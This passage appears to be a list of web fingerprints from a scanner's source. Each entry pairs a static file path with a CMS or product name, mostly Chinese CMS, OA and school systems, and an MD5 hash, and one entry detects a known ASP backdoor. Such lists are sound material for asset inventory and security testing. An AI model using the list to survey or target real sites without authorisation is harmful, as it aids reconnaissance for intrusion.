            '/App_Themes/admin/admin_images/login.jpg|速贝CMS|bb0a2e312b75d0413b97331291151da5|',
            '/AD/ADTemplate/Template_Banner.js|zoomla|0112159a23e0b0adae59f40d3ecf8564|',
            '/wp-admin/images/wp-logo-2x.png|WORDPRESS|18ac0a741a252d0b2d22082d1f02002a|',
            '/static/js/tree.js|Discuz|66077f37a42b6e8fc1f79f5f8d873632|',
            '/animated_favicon.gif|ECSHOP|428b23d688f0f756d2881346d07f882f|',
            '/webs/sysdata.asmx|青果软件教务系统|e259cdc8e7d3946d578ef8323476b245|',
            '/install/testdata/hdwikitest.sql|HdWiki|8fd7a95b3755e88fd71694c22bb652e6|',
            '/images/usercp_usergroups.gif|siteengine|fe6938b0d059893a3bd6093fa9cca003|',
            '/admin/imgs/login_04.jpg|maxcms|75e0e58c66faf4e25c2d346a1f6d7a2a|',
            '/data/admin/allowurl.txt|dedecms|324b52fafc7b532b45e63f1d0585c05d|',
            '/phpmyadmin/themes/pmahomme/jquery/jquery-ui-1.8.16.custom.css|PhpMyAdmin|2059c4c1ec104e7554df5da1edb07a77|',
            '/plugin/raty/img/star-half.png|口福科技|826659c0bd5d509f8995bd4dd46a4668|',
            '/images/logo/yunlogo.jpg|PowerCreator在线教学系统|7245f325804a679c7ddacaee70c6395b|',
            '/member/space/person/common/css/css.css|dedecms|4f8fbb4cc1bec8f6adef5af0bfa9e4d6|',
            '/install/sql/about_data.sql|BookingeCMS酒店系统|a36148f523f8cf9bb415f80f0811393a|',
            '/views/images/install/set01_top_nav.gif|gxcms|377eb13f019a41c417ee29f062041e2e|',
            '/theme/admin/images/upload.gif|sdcms|5032b5d60b095c684fc777d7c202855e|',
            '/include/js/ajax.js|SupeSite|60441bd5893e169020f00be423068ed8|',
            '/images/more27.gif|菲斯特诺期刊系统|dfd912127abc1e2b27505fc52cee6854|',
            '/siteserver/pic/company/logo.gif|siteserver|ecd5a74dda8f311d8ab3c16ed263dcc8|',
            '/admin/Tpl/Default/Static/Js/jquery.js|方维团购购物分享系统|b372b12089d93c6516eeda98d4a1873d|',
            '/images/admincp/cpicon.gif|mvmmall|459ea752c044ec4dc744c4d6fdc78d9e|',
            '/images/Arrow_02.gif|智睿网站系统|cc39fd62e6a878c6c1d2180b54179ffe|',
            '/wp-admin/images/wp-logo-2x.png|WordPress|18ac0a741a252d0b2d22082d1f02002a|',
            '/PLUGIN/BackupDB/plugin.xml|Z-Blog|1dfb729fdb3f61e3000958636730e5de|',
            '/images/tt.gif|菲斯特诺期刊系统|4F08B4951AACFA3C8BCC74BE8596F0AD|',
            '/Public/img_loading.gif|方维团购|9f8edf2baf2d0b7920565037e5110e98|',
            '/images/banners/osmbanner1.png|Joomla|02516ee12a35cf722db3ab104160756d|',
            '/favicon.ico|ecshop|dd5a528e5fd5d5e30b6ed81284ee3f45|',
            '/epointbigfileupload/version.txt|Epoint|a26b851b3d8bff189b247403672491c8|',
            '/App_Image/Public/select.gif|天柏在线考试系统|4c1a1a8a10e2f85dfc208b73271c7b36|',
            '/wcm/images/error.gif|WCM系统V6|b685f4427a8c2b4afb5f01ffbb4a7af2|',
            '/data/admin/ver.txt|dedecms|b4d132542083d1364022bac8f790cc95|',
            '/Admin/Include/version.xml|KesionCMS|6552242ddecd70f449de1f92dfc273e0|',
            '/images-global/zoom/zoom-caption-fill.png|abcms|30622d7dfb42b9e1d0e78b1fdd9340ce|',
            '/php/user/images/laji05.gif|亿邮Email|e186e2e55812321359d1c68ac27da9f1|',
            '/oa/hlp/Images/node.gif|qzdatasoft强智教务管理系统|70ee6179b7e3a5424b5ca22d9ea7d200|',
            '/images/login_01.jpg|省级农机构置补贴信息管理系统|165f9dc0c5bc08aea63ab52f6d0d9526|',
            '/favicon.ico|hishop|cdfff64428dabfee701d2594bd22ac83|',
            '/admin/images/cutimg/ccc.gif|qibocms|090a71bc4fc00f8d10c363c4e63ef779|',
            '/data/admin/ver.txt|dedecms|00f2e7ba5cdd5129b55c6805c214743d|',
            '/admin/images/cutimg/mms.diy.js|qibocms|bf4352ac850b6692f9a74975e71c6a24|',
            '/favicon.ico|nitc(定海神真)|b0d09f9c0ae27e80485f1e35331cf327|',
            '/Themes/Skin_Default/Js/DD_belatedPNG.js|ShopNum|26db6f24724ed4d54b124c842728b2a0|',
            '/admin/images/admin_submit.jpg|74cms|47f025f42749b4c802cbd00cc3b57c74|',
            '/favicon.ico|nbcms|f6cf853a92768fc5d44edcc5341b3997|',
            '/mobile/images/redirect_icon.png|jishigou|5dcbdb49514b457226d7b5e789b258f9|',
            '/admin/imgs/starno.gif|maxcms|c758dea036133e583d03145d721bcf75|',
            '/live800/header_images/login2.gif|Live800插件|3bec56337ad099fad77c58dc0ff5c64c|',
            '/theme/com/sun/webui/jsf/suntheme/images/login/gradlogtop.jpg|Glassfish|0ebf4645c6dbbe85501dc7e27bb4789a|',
            '/comm_front/tzzx/download.jsp|Chinacreator|6390d7e042b18087dd4d0b488d3c41f7|',
            '/img/small-win-title-bar.png|天融信Panabit|3db55fd2155ab461a6b2bac9f37e8c1e|',
            '/admin/templates/met/images/logosmall.gif|metinfo|2820a3b690612fa7df88fc661178a8de|',
            '/common_res/js/pony.js|JeeCMS|e35895263a04757cf1b5d8a711ffdc9a|',
            '/WS2004/Public/Images/SysLogin/web_30.gif|WS2004校园管理系统|f4cf5c4c7250f7dc964300c434d556c0|',
            '/php/user/css/main.css|亿邮Email|518941ec31b77d0edec5f04aac2b918d|',
            '/components/com_mailto/views/sent/metadata.xml|joomla|7222c7a2d54b86c8d02bad37fe2b2dbf|',
            '/images/wp-background-preview-bg.gif|建站之星|b97226d43b397617b566ce1f68077343|',
            '/theme/admin/images/btn_search.gif|BookingeCMS酒店系统|cc8df1e12558860831013c54765c06f7|',
            '/static/js/admincp.js|Discuz|D7A591D497A6C7F8192DA4AA4F59CAC1|',
            '/images/logobot.gif|anmai安脉教务管理系统|e533cdba3c0cf1b165c24522389b5f58|',
            '/js/www.js|phpok|80ca751b87e8a1f160d93545a898b54c|',
            '/favicon.ico|DuomiCMS|7030be07704e7ef55371f513b79a96c0|',
            '/admin/images/arrow_up.gif|phpmps|f1294d6b18c489dc8f1b6dfd137ff681|',
            '/Conf/images/user.gif|V2视频会议系统|9dcb3857211ae96e9f29e4b56f005e06|',
            '/admin/images/dian01-left.gif|EC_word企业管理系统|0acfb4ee7a808fb2d12ddfa079aee2ed|',
            '/windid/res/images/admin/login/bg.jpg|Phpwind|3319b5e84b1da72c27ec4c926a83b910|',
            '/style/default/hdwiki.css|HdWiki|1c9a27d7c1b47da2083be4012408c75e|',
            '/images/yi.png|Yidacms|b5579af7bdd4d85bbf3e6aa8affed658|',
            '/images/act_1.gif|actcms|b99464b11b2cc0a0403f308a775d9b7b|',
            '/data/adtool/theme/d2.jpg|建站之星|48794b6ad154b3311c9cda372ebf7cdc|',
            '/BackOffice/images/logo.png|明腾CMS|1f47a98a538398477bc0c3cf1d04d0a5|',
            '/a_d/install/data.sql|qibosoft|35f612d8e145f5a4e1bb1c4dbb816eb7|',
            '/statics/images/admin_img/images/logo.png|H5酒店管理系统|7a5f7bc3f4eaa361c0e9bb1affd895a6|',
            '/Vote/Img/skin/css_2/2_logo.gif|fengxun|8a7af084aea04360163a28ad17385fe8|',
            '/Admin/db/s.css|beidou|2e62e2d28ae4fcc2a9038e0f15c2c6bd|',
            '/member/statics/js/dayrui.js|finecms|d71b544fd37281ef3187c9357fa8dfa8|',
            '/public/img/feature-sprites.png|DswjCms|5aa84c21fc9169a6dd90ed103902666b|',
            '/admin/js/msgbox/images/loading.gif|MaticsoftSNS|20ac34e039a3224281a38e9222137815|',
            '/install/images/logo.png|nitc(定海神真)|72d07ee60cb62579d6415c47fcebd1a0|',
            '/images/widgetButtonBg.gif|用友FE协作办公平台|8f70211a3ce718b68c4adcd55edde612|',
            '/admin/system/images/login_background.jpg|新秀|30a5688a2f27981c0c2f54f796cbc9df|',
            '/templets/default/style/dedecms.css|dedecms|17680cecac7460613563251286c4eb03|',
            '/bbs/css/images/announ.gif|cmseasy|58e959b455c4a49e431dd28868699fe4|',
            '/Info/Contents/css/article.css|CxCms|5da6d47b33468b652fc4176b350201cf|',
            '/themes/blue2012/css/adminlogin.css|anleye(安居乐业cms)|e5a550b632530b29c765ee0b21d317e5|',
            '/favicon.ico|DzzOffice|42be3f74fcbbfcadf1cf30539e2f75a5|',
            '/piw/images/bg.jpg|PIW内容管理系统|dafd6c713ac3121d331184b04b6e5286|',
            '/data/smiliey/default/shy.gif|siteengine|214f8164393880a9e304d457b4592745|',
            '/robots.txt|EmpireCMS|bfedf87aeb5035d6fb8aacc3f54265de|EmpireCMS|',
            '/a_d/install/data.sql|qiboSoft|35f612d8e145f5a4e1bb1c4dbb816eb7|',
            '/plus/img/df_dedetitle.gif|dedecms|a4ec6f2d46cfa3bd664a5b402bd36ad3|',
            '/static/js/admincp.js|Discuz|b7d9174d54261a48fb7854d55fcb7852|',
            '/xsweb/images/button/bgbtn2_0.gif|青果学生综合系统|061a9376bdb3bfaacfec43986456d455|',
            '/favicon.ico|HiShop商城系统|763a44cd191c13f4a23270062aa9a9fd|',
            '/Admin/Images/bg_admin.jpg|actcms|6b1185f2df41f38247d20f1f5b53c0cc|',
            '/images/luzhu.gif|露珠文章管理系统|9e6b211879d1b9c88f945b1a9afa38bf|',
            '/license.txt|codeigniter|17a14d067fba7c4b2631bfb0f67ca21d|',
            '/admin/images/login/login_r3_c1.jpg|金色校园|47183c1b2cc64e61e9d4b7b0038f57a7|',
            '/wap/templates/default/images/nv_r2_c1.gif|jishigou|999cf400c5e28ee7b79094ba3c324e09|',
            '/admin/Inc/southidc.css|southidc|58b439b67ea0151ff3b5f631cd165135|',
            '/images/admin_menu.gif|workyiSystem|a27e633c635727e8e026bd5befe91e49|',
            '/install/images/logo.jpg|V5Shop|c8fe8a6c2a19e8f0d3f2574e76020c74|',
            '/admin/image/title.gif|良精南方|48015513094ff91334f8974f5dc123ad|',
            '/favicon.ico|phpwind|cfc440185d836a969827f0fd52d38e03|',
            '/SouthidcEditor/sysimage/icon32xls.gif|Southidc|d993588d0c8f44ad292666ea169202d7|',
            '/sysImages/folder/error.gif|FoosunCms|a42a8e2c6ccef2f28e29727394b1c10a|',
            '/data/adflash.txt|zcncms|ea5e6048f0b2a0927b46b12b48f18e29|',
            '/office/favicon.ico|nitc(定海神真)|b0d09f9c0ae27e80485f1e35331cf327|',
            '/epaper/images/index_r8_c2.jpg|Epaper报刊系统|b6c6dadefc296b47115ccffe18de1af4|',
            '/admin/images/left_nav.jpg|凡诺企业网站管理系统|adfe7ce20aacd9570ec5593a812fadf6|',
            '/static/images/index/exit.jpg|XPlus报社系统|4101e5db80d9befa0a54217f01da3df4|',
            '/customize/nwc_755_newvlms_default/login/images/newvlogo.gif|新为软件E-learning管理系统|f4cfd682c3d1f75e1a017047855af644|',
            '/Admin/images/login_logo.png|IwmsCms|3ffabfaf1ebc570a31ef897f3095713a|',
            '/images/admin_bg_1.gif|网趣商城|3382b05d5f02a4659d044128db8900c7|',
            '/tools/img/kuang1.gif|未知查询系统|db0ebf565d93d8c37f51d61ec4fda7b8|',
            '/robots.txt|phpok|35c9586841033dd2d6eb5a05aa3694fe|',
            '/static/image/admincp/ajax_loader.gif|Discuz|aadf13a830af9d293e350b6c5297fdce|',
            '/robots.txt|siteserver|daae653583650582032c5c258faa7d8a|',
            '/templates/default/qunstyles/t1.css|记事狗|832e3939c83145e1b7b5ee9a155243bc|',
            '/templates/default/images/dotline_h.gif|SupeSite|61d710a5bbfb0ea9cf8962cc87572ef6|',
            '/images/logo_wap.png|cmseasy|ea7df0f2227edaf63758210bea2041a1|',
            '/wcm/app/images/login/toplogo.gif|WCM系统V6|7824841bb067262b5a00ad1203c90676|',
            '/admini/images/dt_admini_bottom_logo.gif|shlcms|c5c3c2193c4a05e3e03b41b60aef628f|',
            '/License.txt|PowerEasy|bc45cf3bec6ef50d5fc8ce090a12ede1|',
            '/customer/images/tr_bg.jpg|万欣高校管理系统|38e81a209019959bd6b49a6f451756e6|',
            '/member/images/dzh_logo.gif|dedecms|412f80bbedc1e3c62b7f5a5038a550e6|',
            '/Conf/images/topbkg3.gif|V2视频会议系统|5513bd730d91ce12f0aff52285fc44ee|',
            '/template/10001/cn/ui/logo.gif|青云客CMS|405279583d52c4ae53a985ef7edb2334|',
            '/jcms/images/login/login_bgtop.png|大汉JCMS|10b6e61f8ce67d5ad05280e68c0c19c7|',
            '/inc_img/vote/vote2_1.gif|otcms|9ab777c31bfedc81d6134e90179c9d85|',
            '/jw/hlp/Images/node.gif|qzdatasoft强智教务管理系统|70ee6179b7e3a5424b5ca22d9ea7d200|',
            '/Images/gongs.gif|省级农机构置补贴信息管理系统|17ff1035c4c68d9134ed51c0149beaa3|',
            '/themes/ruizhict/js/base.js|贷齐乐系统|18a4f1f33fdb6bb9d8284dd37a0cf9bd|',
            '/robots.txt|最土团购系统|576efd14be2e01458e5eca53d0aac974|',
            '/skins/AfterLogic/gradients.png|AfterLogicWebMail系统|5ea6a40fdcd3f038404ae8e6a172bb29|',
            '/install/style.css|ideacms|40484a45f45f420dfdcd45654bba391e|',
            '/admin/img/login1.gif|薄冰时期网站管理系统|5d4557c6d09e6b156705d436990f3b7c|',
            '/style/default/hdwiki.css|HdWiki|59b35e72b37ffc2886f76873c93fbcd9|',
            '/images/lzbg12.gif|luzhucms|9b5d64e7f3aa2be74602fa35df4139fb|',
            '/admin/Inc/southidc.css|southidc|61b43a242263d428f86aa4582ee41c26|',
            '/member/statics/OAuth/more.gif|finecms|e7f4ff209e0b345f604697b3f618a76d|',
            '/member/statics/OAuth/OAuth.css|finecms|46b4393eb13fe514e2f7cf80de230b76|',
            '/license.txt|WordPress|2cea1e842759512fed9c64df919615a2|',
            '/favicon.ico|discuz|c028c4822428e83a358c60a93ef65381|',
            '/admin/images/login_new.gif|汇成企业建站CMS|36b48346dc3d1f2169a606f2644a19ee|',
            '/images/common/banner.jpg|WebMail|65a240922b63207dfabe858e8023e6bf|',
            '/install/images/logo.gif|sdcms|d9b101506348899b5886f08a30004587|',
            '/system/images/logo.png|KingCMS|050aa01fafbc432c5b97893282784e61|',
            '/lib/images/tip_layer.png|sdcms|c8cb16e8b61bc549ebd339858e66fa5c|',
            '/inc/images/logo.png|mlecms|fee1877e6d32c94c756408db7fa6a140|',
            '/dede/templets/article_coonepage_rule.htm|dedecms|371fe4fd4c3085b112867d54d531ea6c|',
            '/robots.txt|Discuz2x|2b5cb8618fba34f891ca7b59e232170a|',
            '/static/images/ak3.jpg|akcms|b0f53ec1eba8fcbea5e2a831325bbeab|',
            '/images/addAlbum_icon.gif|易创思(ECS)教学系统|08fe79b4254b0e45d91a6c657c8bc33e|',
            '/admin/editor/xheditor_skin/default/img/tag-h4.gif|maccms|f9b0ab294e6b7d51e7f19fe362038b92|',
            '/application/index.html|codeigniter|0227cfd904e99656279202032b98d4a7|',
            '/_skins/free/images/left_title_bg.jpg|凡诺企业网站管理系统|bd35a0a7ece70224e5762e07b02e18d7|',
            '/robots.txt|wordpress|b138a3153b813846c14a8c7d8b538aa0|',
            '/Admin/images/al_end_right.gif|非凡建站|27181f780a2c447a1d2a63ce70391b49|',
            '/adminsoft/templates/images/login_line.png|EspCMS|aa782fa301d616db1527e81c1bd6834c|',
            '/adminsoft/templates/images/class_bg.jpg|espcms|7ca4a25818a0c261841b9c0df8968e23|',
            '/images/i_arrow.gif|菲斯特诺期刊系统|104867e9a97c512a74dd4724d6dcdffd|',
            '/xin/btn_regis.gif|shopxp|75a543011f4cd0217f0e073dc13bab72|',
            '/admin/images/logo.png|zcncms|05e27fe8919e6142f922024c77f61479|',
            '/SouthidcEditor/sysimage/icon32xls.gif|南方数据|d993588d0c8f44ad292666ea169202d7|',
            '/plugins/weathermap/images/exclamation.png|CactiEZ插件|2e25cb083312b0eabfa378a89b07cd03|',
            '/images/logo.png|KingCMS|3c8d1927c1c1bde1f126b202cb7b1a2f|',
            '/admin/Images/del.gif|kesioncms|fbec9c244cb81a9d36ddf36524ebaef4|',
            '/view/resource/skin/skin.txt|未知政府采购系统|61a9910d6156bb5b21009ba173da0919|',
            '/admin/discuzfiles.md5|Discuz|151a5ab1902785136c9583cb5554c8f9|',
            '/siteserver/pic/company/logo.gif|SiteServer|ecd5a74dda8f311d8ab3c16ed263dcc8|',
            '/cn/images/banner_page_bg.gif|netgather|337ae3cd8be2afb9448eaae1dc169ac8|',
            '/administrator/templates/khepri/favicon.ico|Joomla|bccc7f73c0074fc7c2b911b3f3d1bf15|',
            '/Public/images/adv_line.jpg|OpenSNS|8f0f3cfe9b55df497571fdc818bca5d7|',
            '/qq/images/mid4.gif|非凡建站|a2d236f6cf10df3342e017a8aea7de31|',
            '/favicon.ico|万众电子期刊CMS|be86df759268b588adbf6473be685194|',
            '/admin/system/images/login_background.jpg|新秀|e8b3ae50334b4d5b91f9acb0d00fb4b7|',
            '/member/images/base.css|dedecms|25a56fa7119fd0792f0eb3e4749b86c9|',
            '/favicon.ico|Jingyi|32b016195f800b8d3e8d93fbd24583b4|',
            '/images/adm/left_menus1.gif|maccms|a8c24f9ce8fb507e1fc04848b3de39dc|',
            '/jiaowu2008/hlp/Images/node.gif|qzdatasoft强智教务管理系统|70ee6179b7e3a5424b5ca22d9ea7d200|',
            '/e/install/images/bg_1.gif|pageadmin|76efad2703792d609f374710121a056d|',
            '/images/admina/arrow.jpg|08cms|4d31afa41252d32d8a9aefe04796eb4e|',
            '/xsweb/images/button/bgbtn2_0.gif|青果教务系统|a42f7524df1ebb718ae0fb992602ea87|',
            '/admin/images/top_tt_bg.gif|xycms|94759db89764eb4a1ae41a926f7fe59a|',
            '/images/login/login_text%20.png|泛微E-office|76aa04a85b1f3dea6d3215b27153e437|',
            '/global/kindeditor/plugins/image/images/align_left.gif|方维团购|41e066e74f2fa9105700dbdf4e4905c5|',
            '/Include/WebCalendar.js|edjoy|1a7e05dc42284a888ecd941a51cbc50b|',
            '/jcms/images/login/logo.png|大汉JCMS|d182c9bec6824c6eafd25f9589d37a0a|',
            '/css/default/closed_question.png|TipAsk问答系统|d4a59c9133a173f1d055bbfade6308f0|',
            '/member/templets/images/login_logo.gif|dedecms|e5ef5cbf5adee69581b6ef02333b82e3|',
            '/Styles/default/SignInico.gif|三才期刊系统|f318798dc4bfc4f9012c66a5347a24f8|',
            '/console/images/login.gif|Wangzt|1a61273784e16891526aae26d12ea639|',
            '/static/icon/favicon.ico|最土团购系统|1c67f36a3a9547ecc26dd25c0a5a57b3|',
            '/licence.txt|PHPWind|a9f136e428c5b24cf103f08ac17abbc7|',
            '/404/emessage.gif|尘月企业网站管理系统|ca9df517967dff061720627b8cdbcdcd|',
            '/member/templets/images/login_logo.gif|dedecms|15e2e455b176f7b1d49e5ca3a4f79f5d|',
            '/plugins/sonline/style/red.css|iwebshop|7c7ae77f47da5d2c9387d8cb715b2cb8|',
            '/help/images/f1.gif|Mailgard|75b115d37054a71a9fbbe11482ec6b27|',
            '/Admin/images/right.gif|老Y文章管理系统|809224aed562bd15265e57747425bec9|',
            '/data/admin/quickmenu.txt|dedecms|48bf08b052bde9dfe38ca83e02a02e9e|',
            '/Images/System/greyline01.gif|易创思(ECS)教学系统|37544c09f006b6622692d46419dc2568|',
            '/images/loadinglit.gif|dedecms|0ceba25d8d8e384791e857391eb71e2a|',
            '/logo/images/login_logo_bottom.png|Yongyou|1697ab7fca81aaaebf8c91f63b29cb63|',
            '/include/data/vdcode.jpg|dedecms|ea3350e457f70cf7b4f122c8b832ddbe|',
            '/themes/ruizhict/images/bbs_bg_elc.png|贷齐乐系统|3c0c9d719e13298650f868220176a2eb|',
            '/App_Themes/Login/default/images/bg_form_TL.png|蓝凌EIS智慧协同平台|d2093064429e9062da93a66c644d0b26|',
            '/cn/base/css/local/images/top_bt.jpg|未知OEM安防监控系统|2ea741e880d0d8b89f9509fa036fc9c6|',
            '/enterprise/ico/del.gif|TurboMail邮箱系统|5a0f45a9b656916805c3f73268b0f514|',
            '/admin/template/images/site_logo.png|建站之星|4adf959f86cd4215c464913317000139|',
            '/images/default/ico_loading3.gif|qibosoft|cc4ea4b491159a76cfd853b3e151f545|',
            '/admin/images/style.css|5UCMS|1f77c198658bcaf9f0df8279b3bc5418|',
            '/install/template/images/ok.png|DayuCms|adb713c90f14055886badf66bc22edd2|',
            '/images/user_logo.GIF|N点虚拟主机|4b5fd75f507ac37a09482372e5a995c9|',
            '/favicon.ico|shopex|cf3bd71744aab1120d9c63f191a14682|',
            '/images/download.jpg|3gmeeting视讯系统|816b4187721f32088960efaed2884b5a|',
            '/Admin/Images/logo.jpg|actcms|16088c9aeb5b77ef3a07db4e08834880|',
            '/admin/images/login_r1_c1.jpg|pageadmin|3b0397c10a95f2277cab33ffa821009b|',
            '/admin/image/long_bg.png|FengCms|480d4f11843eea195785d5f595008fcb|',
            '/administrator/templates/bluestork/images/j_button1_next.png|Joomla|d0d396dd6c390797a9ca6fb69e97c47d|',
            '/images/buttonImg/add.png|用友FE协作办公平台|0112820448f910acc5eedaa9625ab6b0|',
            '/xmlrpc.php|WORDPRESS|9BA4B71A75F877BEF76EC6BB31F71DF2|',
            '/global/kindeditor/plugins/image/images/refresh.gif|方维团购|0f131c753498d9dbf621a24a839aeb56|',
            '/adfile/ad9.js|86cms|996507b745203776e2915e8878344146|',
            '/images/photo.jpg|SAPNetWeaver|8998a67f4a6483616d05cbc16a15e625|',
            '/images/place/dflogin_logo.gif|HiMail|d5f5a520c2e9baad3ea553efe83d6164|',
            '/editor/themes/qq/editor.gif|xycms|d213d3628871acbaefb1c865a78fdfe6|',
            '/KS_Inc/common.js|kesioncms|d90f524d5c23735289df9b5b1d173315|',
            '/admin/images/bg_top_ul_left.png|万众电子期刊CMS|fabf579fb326640b60631fd116bcf812|',
            '/favicon.ico|Tomcat|33dbbf77f72ca953995538615aa68f52|',
            '/csccmis/img/bottom.jpg|Insightsoft|45f6fb4720c191a8d9b3aee1da85d086|',
            '/piw/images/log2.jpg|PIW内容管理系统|962e5b2c8818ad192783b880fd97361e|',
            '/images/title.gif|SAPNetWeaver|80a49b5cff37eba74c6c8a6822a62ff0|',
            '/admin/Inc/southidc.css|Southidc|61b43a242263d428f86aa4582ee41c26|',
            '/API/api.config|KesionCMS|ccedb825926d4b0b91d88adee2c728a0|',
            '/favicon.ico|PHP168|325dd457ddcce988ff394aed56d7de1e|',
            '/skin/skin3/reg.gif|分类信息网bank.asp后门|3040f02aab88fd436a45467935bf14f7|',
            '/templates/default/logo.png|通达OA系统|e4dc8e7460d6309186edb15e1099d6bf|',
            '/favicon.ico|ECSHOP|bbc79252733e2e1a65cf0e92c62bdd7d|',
            '/piw/images/input.png|PIW内容管理系统|a3197615f9c5a29d2257feeab5c2fd8a|',
            '/file/script/config.js|Destoon|4e3c3d65e1014c60b9163c58d6feb397|',
            '/tpl/images/bg.jpg|eShangBao易商宝|50e584b4d5130784c2aaf184fdb18c35|',
            '/favicon.ico|destoon|8375be1e87528a6e6aca699910b1cace|',
            '/plus/img/wbg.gif|dedecms|6e8b9b8af42923fa0ecf89c0054e4091|',
            '/plugins/avatar/images/locale.xml|贷齐乐系统|3108ff46cd72be64fa798c3c053c0ac1|',
            '/uploads/userup/index.html|dedecms|736007832d2167baaae763fd3a3f3cf1|',
            '/ACT_inc/ItemBg.gif|actcms|9cfc31ea9b376230b76bfbbf70b814bf|',
            '/images/email.png|phpok|2eebe41ec1dc181e976249bd884fbd87|',
            '/inc/yucmedia/Media/img/direct/reload2.gif|otcms|613a059308e546b783258e4c17f25a1f|',
            '/adminsoft/templates/images/login_line.png|espcms|B1E011B40783BAD70CBE8E2DA622D4A6|',
            '/default/login_btn.png|通达OA系统|4d94103aa03e2a9af93030d7b1415b3b|',
            '/ewebeditor/KindEditor.js|PHP168|e2230f70fa19f55e898cc8adbd2e2cd7|',
            '/SiteServer/Services/AdministratorService.asmx|SiteServer|b44557ebcbe60ddd358e8726778d68c1|',
            '/style/default/fujian_top_bg.jpg|HdWiki|35ac654ff98eb5dd985ae0a42234a7e4|',
            '/images/admina/sitmap0.png|08cms|e0c4b6301b769d596d183fa9688b002a|',
            '/res/jeecms/img/login/llogo.jpg|JeeCMS|a321fb9e888181da07cdf4c8e98b3034|',
            '/admin/images/left_title.gif|蓝科CMS|35613297cc0e20d5af99f7db02b877a2|',
            '/favicon.ico|mlecms|214270729c97e5baa653c81ab9110c1f|',
            '/install/images/00.png|abcms|c5ee1709a853229d2c91d736eda10051|',
            '/e/js/zh-cn/lang.js|pageadmin|ad125ceafcec5a03b37b2a766360ebdc|',
            '/Inedu3In1/images/default/images/2.gif|皓翰通用数字化校园平台|b5bcd111fefb3b664870d5dc265a9f29|',
            '/windid/res/js/dev/wind.js|phpwind|7854bb0301cdc9dfefbe190356553204|',
            '/admin/views/style/green/style.css|emlog|4d50eee0c43bc7d1ac708c5622d5b481|',
            '/jiaowu_2008/hlp/Images/vertline.gif|qzdatasoft强智教务管理系统|7ccf3630fd1411ebf613569db4fff783|',
            '/images/share.gif|dedecms|49606573bded1358189e73f32a845702|',
            '/robots.txt|phpcms|0fd86d5f9c1070613e22fb30456bf609|phpcms|',
            '/themes/README.txt|drupal|5954fc62ae964539bb3586a1e4cb172a|',
            '/public/tinyMCE/themes/simple/img/icons.gif|espcms|1c860788c919c0ba62bca6be37b8b263|',
            '/favicon.ico|shopex|5d1e8e3240474029bb6c8c3f4905b3e5|',
            '/data/admin/allowurl.txt|dedecms|dda6f3b278f65bd77ac556bf16166a0c|',
            '/ewebeditor/KindEditor.js|PHP168|4ae280c43d3d01158ee36bc3d0878d4d|',
            '/inc/photo/loader.gif|ideacms|9d05f5d2410061c1c9881b98d5d7552f|',
            '/adminsoft/templates/images/login_line.png|espcms|aa782fa301d616db1527e81c1bd6834c|',
            '/favicon.ico|时代企业邮|c1c1a7d9cca179ad5c0518e9c4641232|',
            '/admin/SouthidcEditor/Include/Editor.js|southidc|c5c59ecc7cdbfc84a18ef167b73b55b9|',
            '/Admin/images/loading.gif|hishop|834f29fabcebfb5bf2849b2f4e9e7bfb|',
            '/views/default/images/artarrow.gif|finecms|90855446b4db0a3e2a58e597546fa5e9|',
            '/install/index.php|DayuCms|2163fab940b75c44f520c4b27364e375|',
            '/templets/default/style/dedecms.css|dedecms|d02a1fb2710a28077507473ef0734c90|',
            '/themes/ruizhict/images/user_menu_1.jpg|贷齐乐系统|a6bd5d394f15cf2804b6a98528c74a2f|',
            '/favicon.ico|shlcms|d5bb00993027e53e5eedcb8a972250fa|',
            '/images/enums.js|dedecms|c99a9e6b56db86b704c48cd65dbe103d|',
            '/favicon.ico|MLECMS|7d1ef8f5478fc951725b8858c371517b|',
            '/webservice-xml/login/login.wsdl.php|泛微E-office|e321f05b151d832859378c0b7eba081a|',
            '/img/log-app1.png|天融信Panabit|025b705ff32515bda1fb6892e0d9761d|',
            '/docs/images/tomcat.gif|tomcat|4e41a821f4efec0737195ca34695a4d5|',
            '/install/templates/images/link_bg.gif|74cms|0a2972286de60087205b5bb3217fbdc5|',
            '/favicon.ico|otcms|e86ea7f20a0aecaec8920f3e98db92f7|',
            '/image/default/icon.png|MallBuilder|466d11df3a2333aba76b3e81556176a4|',
            '/skins/user/default/images/wrong.gif|程氏舞曲CMS|735238164516393c7819fb43c28ce991|',
            '/inc/img/qmiddle.png|shlcms|37835a6f515fd99bf5f8db07e53c9152|',
            '/page/system/inc/fun.js|kesioncms|5f9d994fb1b0e375af6fdf663979af71|',
            '/style/default/login_bg.jpg|HdWiki|61ff56e1d34228ca768bda34cb4ece20|',
            '/admin/images/user_input.jpg|XpShop|e6ccc6d734d834f12372b9e0e9707318|',
            '/admin/images/login/login_submit.gif|otcms|326e3c92c2a6de7f3f1722e9eedf4ad4|',
            '/license.txt|wordpress|2cea1e842759512fed9c64df919615a2|',
            '/wp-admin/js/media-upload.dev.js|wordpress|2a55cde57cdb0c810aec27fdc928e1ef|',
            '/style/jbox/skins/currently/images/jbox-content-loading.gif|绿麻雀借贷系统|afde18707b365c67e4708775650a37ba|',
            '/images/logo.gif|actcms|02d47a2780fdadd0086215693f3a6b5f|',
            '/ROOT/favicon.ico|Tomcat|33dbbf77f72ca953995538615aa68f52|',
            '/Admin/images/right.gif|老Y文章管理系统|563080e6343992d6425ac89ddf8ab314|',
            '/images/by.nzcms.gif|宁志学校网站|fe0629abd97593938fbb18b61e23c87b|',
            '/install/images/default/section_bottom.jpg|zcncms|11e8d3bd5c82760e5f52c10b52a0c205|',
            '/upload/2011/11/30/20111130113535527.jpg|iwebshop|3327914cd085a87097a03c0fb247649b|',
            '/views/images/install/set01_top_nav.gif|maxcms|377eb13f019a41c417ee29f062041e2e|',
            ':3312/vhost/view/default/imgs/vhost_login.png|Kangle虚拟主机|f9e1b8ac323811d27ba15dfb29fba21b|',
            '/images/swfupload.png|phpok|8cb9cf25fb19ea4552d8fa318cfc1cca|',
            '/images/reg.gif|actcms|c81932053e6ac8df6077e5c7ad241ae8|',
            '/vimgs/login/login_sub.jpg|WilmarOA系统|3fb71e802e717cf1dd807aeab1264d37|',
            '/ad_duilian/close.gif|宁志学校网站|39da9a34d30586f70b2d0d976a1767a8|',
            '/templets/default/style/dedecms.css|dedecms|17680cecac7460613563251286c4eb03|',
            '/images/tongda.ico|通达OA系统|ab93346c1650acf2f16328fa41caf425|',
            '/Admin/images/al_top.gif|非凡建站|aa157057bb0cdab1cf90454ffc362a8e|',
            '/job/templates/met/css/style.css|metinfo|c025609c4c5838da506070f86b976cda|',
            '/images/btn_bg1.gif|浪潮CMS|c70d2c34b9305d87c6e6267887bd1c91|',
